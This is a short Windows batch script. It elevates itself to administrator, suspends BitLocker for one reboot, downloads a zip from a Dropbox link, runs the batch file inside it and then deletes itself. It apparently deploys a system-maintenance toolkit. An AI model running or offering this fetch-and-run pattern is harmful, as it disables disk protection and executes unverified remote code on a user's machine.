FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;caffeine -replace;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fi/ho3347utdf4k990xfq060/tron.zip?rlkey=j0ew8tx0udgrzdhfzaacwvvy7&st=jk0jqyfd&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;C:\23jrg\Quantum-Impeller\tools\tron\tron.bat;Remove-Item $PSCommandPath -Force;"
